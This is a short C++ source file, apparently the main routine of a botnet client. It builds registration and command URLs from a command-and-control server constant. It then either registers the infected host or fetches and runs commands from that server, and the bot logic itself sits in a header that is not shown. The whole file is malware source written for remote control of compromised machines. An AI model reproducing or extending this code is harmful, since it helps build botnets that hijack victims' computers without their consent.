#include <stdio.h>
#include <fstream>
#include <string>

#include "bot.hh"

int main() {
    std::string register_url, command_url, seed_path;

    register_url = C2_SERVER + REGISTER_URI;
    seed_path = util::GetInstallDir() + SEED_FILE;
    command_url = C2_SERVER + CMD_URI;

    Bot host(seed_path, register_url, command_url);

    if (host.IsInit()) {
        host.ExecuteCommand();
    } else {
        host.Init();
    }

    return 0;
}
